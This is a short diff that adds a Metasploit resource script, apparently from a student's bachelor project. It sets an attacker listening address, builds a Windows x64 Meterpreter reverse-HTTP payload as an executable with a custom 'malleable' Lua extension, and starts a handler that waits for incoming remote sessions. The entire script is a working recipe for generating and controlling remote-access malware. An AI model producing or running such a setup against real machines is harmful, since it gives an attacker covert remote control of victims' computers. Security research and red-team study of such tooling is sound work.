@@ -1,0 +1,15 @@
+ setg LHOST 192.168.42.201
+
+ use payload/windows/x64/meterpreter_reverse_http
+ set LPORT 5555
+ set EXTINIT malleable,/home/timo/Projects/bachelor/malleableScript.lua
+ generate -f exe -o /mnt/hgfs/Shared_Folder/bachelor/meterpreter_out/meterpreter.exe
+
+ use multi/handler
+ set ExitOnSession false
+
+ set payload windows/x64/meterpreter_reverse_http
+ set LPORT 5555
+ run -j
+
+ jobs -v
